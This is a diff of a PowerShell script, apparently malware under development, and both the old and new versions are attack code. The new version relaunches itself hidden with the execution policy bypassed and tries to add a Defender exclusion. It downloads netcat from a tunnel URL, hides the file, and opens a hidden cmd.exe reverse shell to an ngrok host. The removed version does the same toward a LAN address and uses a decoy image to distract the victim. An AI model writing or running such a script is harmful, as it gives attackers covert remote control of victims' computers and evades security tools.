@@ -1,26 +1,39 @@
-# Set URLs and paths
-$url = "http://192.168.0.117/nc.exe"
-$desktopPath = [System.Environment+SpecialFolder]::Desktop
-$filename = "nc.exe"
-$finalPath = Join-Path -Path $desktopPath -ChildPath $filename
+function Ensure-WindowsPowerShell {
+    if ($PSVersionTable.PSEdition -ne 'Desktop') {
+        $script = $MyInvocation.MyCommand.Definition
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script`""
+        exit
+    }
+}
+Ensure-WindowsPowerShell
 
-$url2 = "https://yt3.ggpht.com/..."  # Replace with real decoy image URL
-$filename2 = "handsome01.jpg"
-$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2
+try {
+    # === 1. Optional: Add Defender Exclusion (fails silently if not admin) ===
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
+} catch {}
 
-# Download Netcat and hide it
-Invoke-WebRequest -Uri $url -OutFile $finalPath
-Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+try {
+    # === 2. Download Netcat (nc.exe) from public HTTPS URL ===
+    $ncUrl = "https://9d869f58c38aeb.lhr.life/nc.exe"  # Replace with your own localhost.run link
+    $ncPath = Join-Path -Path ([Environment]::GetFolderPath("Downloads")) -ChildPath "nc.exe"
 
-# Download decoy image and hide it
-Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
-Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
 
-# Define Netcat reverse shell arguments
-$params = "-d 192.168.0.117 4444 -e cmd.exe"
+    # === 3. Hide the downloaded nc.exe binary ===
+    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+} catch {
+    Write-Error "Failed to download or hide nc.exe: $_"
+    exit
+}
 
-# Execute Netcat reverse shell
-Start-Process -FilePath $finalPath -ArgumentList $params
+try {
+    # === 4. Launch Netcat reverse shell to ngrok tunnel ===
+    $ngrokHost = "0.tcp.ngrok.io"      # Replace with your ngrok public TCP hostname
+    $ngrokPort = 19234                 # Replace with your ngrok-assigned port
 
-# Open the decoy image to distract the user
-Start-Process $finalPath2
+    $args = "-d $ngrokHost $ngrokPort -e cmd.exe"
+
+    Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden
+} catch {
+    Write-Error "Failed to start reverse shell: $_"
+}
